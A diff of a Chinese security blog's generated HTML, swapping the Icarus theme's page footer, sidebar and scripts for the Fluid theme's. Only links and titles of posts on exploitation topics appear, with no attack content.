<code>_config.yml</code>.</div><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">注册表劫持BypassUAC</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/"><span class="level-item">PHPOK v5.5 csrf+反序列化漏洞getshell分析</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div class="notification is-danger">You forgot to set the <code>shortname</code> for Disqus. Please set it in <code>_config.yml</code>.</div></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">45</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-30T07:20:41.000Z">2021-05-30</time></p><p class="title"><a href="/2021/05/30/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro-550反序列化漏洞分析</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-28T04:36:53.000Z">2021-05-28</time></p><p class="title"><a href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/">ESP定律和动态脱UPX壳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-23T06:38:50.000Z">2021-05-23</time></p><p class="title"><a href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/">Servlet学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-18T06:04:20.000Z">2021-05-18</time></p><p class="title"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">CISCN2021 web部分题解</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-14T10:17:39.000Z">2021-05-14</time></p><p class="title"><a href="/2021/05/14/MRCTF2020-EzpopRevenge/">MRCTF2020-EzpopRevenge</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
-            article: {
-                highlight: {
-                    clipboard: true,
-                    fold: 'unfolded'
-                }
-            }
-        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
-      window.cookieconsent.initialise({
-        type: "info",
-        theme: "edgeless",
-        static: false,
-        position: "bottom-left",
-        content: {
-          message: "此网站使用Cookie来改善您的体验。",
-          dismiss: "知道了！",
-          allow: "允许使用Cookie",
-          deny: "拒绝",
-          link: "了解更多",
-          policy: "Cookie政策",
-          href: "https://www.cookiesandyou.com/",
-        },
-        palette: {
-          popup: {
-            background: "#edeff5",
-            text: "#838391"
-          },
-          button: {
-            background: "#4b81e8"
-          },
-        },
-      });
-    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
-            if (typeof $.fn.lightGallery === 'function') {
-                $('.article').lightGallery({ selector: '.gallery-item' });
-            }
-            if (typeof $.fn.justifiedGallery === 'function') {
-                if ($('.justified-gallery > p > .gallery-item').length) {
-                    $('.justified-gallery > p > .gallery-item').unwrap();
-                }
-                $('.justified-gallery').justifiedGallery();
-            }
-        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
-            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
-        });</script></body></html>
+<p><a href="https://www.freebuf.com/articles/network/185324.html">https://www.freebuf.com/articles/network/185324.html</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">注册表劫持BypassUAC</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">PHPOK v5.5 csrf+反序列化漏洞getshell分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
